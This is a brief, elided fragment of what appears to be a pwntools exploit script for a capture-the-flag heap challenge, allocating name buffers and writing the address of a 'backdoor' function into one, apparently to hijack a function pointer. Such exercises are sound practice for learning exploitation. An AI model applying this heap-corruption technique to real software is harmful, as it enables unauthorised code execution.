...
io.sendlineafter("Her name size is :", '32')
io.sendafter("Her name is :", 'aaaa')
...
io.sendlineafter("Your choice :", '1')
io.sendlineafter("Her name size is :", '16')
io.sendlineafter("Her name is :", p64(cur_elf.sym['backdoor']))
